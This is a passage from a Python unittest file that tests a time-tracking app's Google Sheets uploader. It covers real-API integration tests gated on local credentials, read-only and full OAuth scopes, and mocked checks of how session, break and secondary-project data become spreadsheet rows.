            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsRealAPIIntegration(unittest.TestCase):
    """Integration tests with real Google Sheets API (requires credentials)"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

        # Check for credentials in both project root and tests directory
        self.project_root = os.path.dirname(os.path.dirname(__file__))
        self.test_dir = os.path.dirname(__file__)

        # Try project root first, then tests directory
        if os.path.exists(os.path.join(self.project_root, "credentials.json")):
            self.credentials_path = os.path.join(self.project_root, "credentials.json")
        else:
            self.credentials_path = os.path.join(self.test_dir, "credentials.json")

        if os.path.exists(os.path.join(self.project_root, "token.pickle")):
            self.token_path = os.path.join(self.project_root, "token.pickle")
        else:
            self.token_path = os.path.join(self.test_dir, "token.pickle")

        # Load test config if environment variable not set
        if not os.environ.get("TEST_GOOGLE_SHEETS_ID"):
            test_config_path = os.path.join(
                os.path.dirname(__file__), "test_config.json"
            )
            if os.path.exists(test_config_path):
                try:
                    with open(test_config_path, "r") as f:
                        config = json.load(f)
                        if "TEST_GOOGLE_SHEETS_ID" in config:
                            os.environ["TEST_GOOGLE_SHEETS_ID"] = config[
                                "TEST_GOOGLE_SHEETS_ID"
                            ]
                except Exception:
                    pass  # Silently ignore config file errors

    @patch("src.google_sheets_integration.GoogleSheetsUploader._ensure_sheet_headers")
    @patch("src.google_sheets_integration.messagebox.showerror")
    @unittest.skipUnless(
        (
            os.path.exists(
                os.path.join(
                    os.path.dirname(os.path.dirname(__file__)), "credentials.json"
                )
            )
            or os.path.exists(
                os.path.join(os.path.dirname(__file__), "credentials.json")
            )
        )
        and (
            os.path.exists(
                os.path.join(os.path.dirname(os.path.dirname(__file__)), "token.pickle")
            )
            or os.path.exists(os.path.join(os.path.dirname(__file__), "token.pickle"))
        ),
        "Requires Google API credentials (credentials.json and token.pickle)",
    )
    def test_real_upload_to_google_sheets(self, mock_error, mock_headers):
        """Integration test: Actually upload to Google Sheets (REQUIRES CREDENTIALS)"""
        # Mock header validation to always pass (this test validates upload mechanics, not header order)
        mock_headers.return_value = True

        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Clear any test env vars that might interfere
            os.environ.pop("GOOGLE_SHEETS_SPREADSHEET_ID", None)
            os.environ.pop("GOOGLE_SHEETS_CREDENTIALS_FILE", None)
            os.environ.pop("GOOGLE_SHEETS_TOKEN_FILE", None)

            # Use real settings
            settings = TestDataGenerator.create_settings_data()
            # Find credentials file (check both locations)
            project_root = os.path.dirname(os.path.dirname(__file__))
            test_dir = os.path.dirname(__file__)
            if os.path.exists(os.path.join(project_root, "credentials.json")):
                creds_file = os.path.join(project_root, "credentials.json")
            else:
                creds_file = os.path.join(test_dir, "credentials.json")

            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": os.environ.get(
                    "TEST_GOOGLE_SHEETS_ID", ""
                ),  # Set in env
                "sheet_name": "Test Sessions",
                "credentials_file": creds_file,
            }

            if not settings["google_sheets"]["spreadsheet_id"]:
                self.skipTest("TEST_GOOGLE_SHEETS_ID environment variable not set")

            print(
                f"DEBUG: Using spreadsheet ID: {settings['google_sheets']['spreadsheet_id']}"
            )

            test_file = self.file_manager.create_test_file(
                "test_real_upload.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            actual_id = uploader.get_spreadsheet_id()
            print(f"DEBUG: Uploader sees spreadsheet ID: {actual_id}")

            # Create test session
            session_data = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "[TEST] Work",
                "project": "[TEST] Integration Test",
                "total_duration": 1800,
                "active_duration": 1500,
                "break_duration": 300,
            }

            # Actually upload (requires authentication)
            result = uploader.upload_session(session_data, "test_integration_123")

            # Should succeed with real credentials and valid spreadsheet ID
            # If it fails, check the error wasn't shown (should be mocked)
            if not result:
                # Check if error was permission/not found (mocked, so we won't know exact error)
                # Just verify no blocking dialog appeared
                pass

            self.assertTrue(
                result, "Upload failed - check credentials and spreadsheet ID"
            )

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @unittest.skipUnless(
        os.path.exists(
            os.path.join(os.path.dirname(os.path.dirname(__file__)), "credentials.json")
        )
        or os.path.exists(os.path.join(os.path.dirname(__file__), "credentials.json")),
        "Requires Google API credentials (credentials.json)",
    )
    def test_real_authentication(self, mock_error):
        """Integration test: Test real authentication flow"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Find credentials file (check both locations)
            project_root = os.path.dirname(os.path.dirname(__file__))
            test_dir = os.path.dirname(__file__)
            if os.path.exists(os.path.join(project_root, "credentials.json")):
                creds_file = os.path.join(project_root, "credentials.json")
            else:
                creds_file = os.path.join(test_dir, "credentials.json")

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                "credentials_file": creds_file,
            }

            test_file = self.file_manager.create_test_file(
                "test_real_auth.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            result = uploader.authenticate()

            # With real credentials, should succeed
            self.assertTrue(result, "Authentication failed with real credentials")
            self.assertIsNotNone(uploader.service)
            self.assertIsNotNone(uploader.credentials)

            # Should not show error dialogs on success
            mock_error.assert_not_called()

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsReadOnly(unittest.TestCase):
    """Test read-only mode"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch("src.google_sheets_integration.os.path.exists")
    def test_read_only_mode_uses_readonly_scopes(self, mock_exists):
        """Test that read-only mode uses readonly scopes"""
        try:
            from src.google_sheets_integration import (
                GoogleSheetsUploader,
                SCOPES_READONLY,
            )

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
            }

            test_file = self.file_manager.create_test_file(
                "test_readonly.json", settings
            )

            uploader = GoogleSheetsUploader(test_file, read_only=True)
            self.assertEqual(uploader.scopes, SCOPES_READONLY)
            self.assertTrue(uploader.read_only)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    def test_full_mode_uses_full_scopes(self, mock_exists):
        """Test that full mode uses full scopes"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader, SCOPES_FULL

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
            }

            test_file = self.file_manager.create_test_file("test_full.json", settings)

            uploader = GoogleSheetsUploader(test_file, read_only=False)
            self.assertEqual(uploader.scopes, SCOPES_FULL)
            self.assertFalse(uploader.read_only)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsDetailedFormat(unittest.TestCase):
    """Test that Google Sheets upload uses detailed format matching CSV export"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.build")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_detailed_format_with_active_periods(
        self, mock_exists, mock_build, mock_error
    ):
        """Test that upload creates separate rows for each active period"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock service
            mock_service = MagicMock()
            mock_build.return_value = mock_service

            # Mock authentication
            mock_exists.return_value = True

            # Create test settings
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_detailed_format.json", settings
            )

            # Create uploader and set authenticated service
            uploader = GoogleSheetsUploader(test_file)
            uploader.service = mock_service
            uploader.credentials = MagicMock()

            # Mock the header check
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [
                    [
                        "Session ID",
                        "Date",
                        "Sphere",
                        "Session Start Time",
                        "Session End Time",
                        "Session Total Duration (min)",
                        "Session Active Duration (min)",
                        "Session Break Duration (min)",
                        "Type",
                        "Project",
                        "Project Comment",
                        "Secondary Project",
                        "Secondary Comment",
                        "Secondary Percentage",
                        "Activity Start",
                        "Activity End",
                        "Activity Duration (min)",
                        "Break Action",
                        "Secondary Action",
                        "Active Notes",
                        "Break Notes",
                        "Idle Notes",
                        "Session Notes",
                    ]
                ]
            }

            # Mock the append response
            mock_service.spreadsheets().values().append().execute.return_value = {
                "updates": {"updatedCells": 23}
            }

            # Create session with multiple active periods
            session_data = {
                "date": "2024-01-20",
                "sphere": "Work",
                "start_time": "10:00:00",
                "end_time": "11:00:00",
                "total_duration": 3600,
                "active_duration": 3000,
                "break_duration": 600,
                "session_comments": {
                    "active_notes": "Active session notes",
                    "break_notes": "Break notes",
                    "idle_notes": "Idle notes",
                    "session_notes": "Overall session notes",
                },
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:25:00",
                        "duration": 1500,
                        "project": "Project A",
                        "comment": "Working on feature X",
                    },
                    {
                        "start": "10:35:00",
                        "end": "11:00:00",
                        "duration": 1500,
                        "project": "Project B",
                        "comment": "Code review",
                    },
                ],
                "breaks": [
                    {
                        "start": "10:25:00",
                        "duration": 600,
                        "action": "Coffee",
                        "comment": "Quick coffee break",
                    }
                ],
                "idle_periods": [],
            }

            # Upload session
            result = uploader.upload_session(session_data, "session_123")

            # Verify success
            self.assertTrue(result)

            # Get the call arguments
            append_call = mock_service.spreadsheets().values().append.call_args

            # Verify append was called with correct data
            self.assertIsNotNone(append_call)

            # Get the body parameter
            body = append_call[1]["body"]
            rows = body["values"]

            # Should have 3 rows: 2 active + 1 break
            self.assertEqual(len(rows), 3)

            # Verify first active row
            row1 = rows[0]
            self.assertEqual(row1[0], "session_123")  # session_id
            self.assertEqual(row1[1], "2024-01-20")  # date
            self.assertEqual(row1[2], "Work")  # sphere
            self.assertEqual(row1[8], "active")  # type
            self.assertEqual(row1[9], "Project A")  # project
            self.assertEqual(row1[10], "Working on feature X")  # project_comment
            self.assertEqual(row1[14], "10:00:00")  # activity_start
            self.assertEqual(row1[15], "10:25:00")  # activity_end
            self.assertEqual(row1[16], 25.0)  # activity_duration in minutes

            # Verify second active row
            row2 = rows[1]
            self.assertEqual(row2[8], "active")  # type
            self.assertEqual(row2[9], "Project B")  # project
            self.assertEqual(row2[10], "Code review")  # project_comment

            # Verify break row
            row3 = rows[2]
            self.assertEqual(row3[8], "break")  # type
            self.assertEqual(row3[10], "Quick coffee break")  # primary action comment
            self.assertEqual(row3[17], "Coffee")  # break_action

            # Verify session comments are in all rows
            for row in rows:
                self.assertEqual(row[19], "Active session notes")  # active_notes
                self.assertEqual(row[20], "Break notes")  # break_notes
                self.assertEqual(row[21], "Idle notes")  # idle_notes
                self.assertEqual(row[22], "Overall session notes")  # session_notes

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.build")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_with_secondary_projects(self, mock_exists, mock_build, mock_error):
        """Test that upload handles secondary projects correctly"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock service
            mock_service = MagicMock()
            mock_build.return_value = mock_service
            mock_exists.return_value = True

            # Create test settings
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_secondary_projects.json", settings
            )

            # Create uploader
            uploader = GoogleSheetsUploader(test_file)
            uploader.service = mock_service
            uploader.credentials = MagicMock()

            # Mock responses
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [
                    [
                        "Session ID",
                        "Date",
                        "Sphere",
                        "Session Start Time",
                        "Session End Time",
                        "Session Total Duration (min)",
                        "Session Active Duration (min)",
                        "Session Break Duration (min)",
                        "Type",
                        "Project",
                        "Project Comment",
                        "Secondary Project",
                        "Secondary Comment",
                        "Secondary Percentage",
                        "Activity Start",
                        "Activity End",
                        "Activity Duration (min)",
                        "Break Action",
                        "Secondary Action",
                        "Active Notes",
                        "Break Notes",
                        "Idle Notes",
                        "Session Notes",
                    ]
                ]
            }
            mock_service.spreadsheets().values().append().execute.return_value = {
                "updates": {"updatedCells": 23}
            }

            # Session with secondary project
            session_data = {
                "date": "2024-01-20",
                "sphere": "Work",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "total_duration": 1800,
                "active_duration": 1800,
                "break_duration": 0,
                "session_comments": {},
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:30:00",
                        "duration": 1800,
                        "projects": [
                            {
                                "name": "Primary Project",
                                "project_primary": True,
                            },
                            {
                                "name": "Secondary Project",
                                "project_primary": False,
                                "comment": "Supporting work",
                                "percentage": "30",
                            },
                        ],
                        "comment": "Multi-project work",
                    }
                ],
                "breaks": [],
                "idle_periods": [],
            }

            # Upload
            result = uploader.upload_session(session_data, "session_456")
            self.assertTrue(result)

            # Get uploaded data
            body = mock_service.spreadsheets().values().append.call_args[1]["body"]
            rows = body["values"]

            # Should have 1 row
            self.assertEqual(len(rows), 1)

            row = rows[0]
            self.assertEqual(row[9], "Primary Project")  # project
            self.assertEqual(row[10], "Multi-project work")  # project_comment
            self.assertEqual(row[11], "Secondary Project")  # secondary_project
            self.assertEqual(row[12], "Supporting work")  # secondary_comment
            self.assertEqual(row[13], "30")  # secondary_percentage

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


if __name__ == "__main__":
    unittest.main()
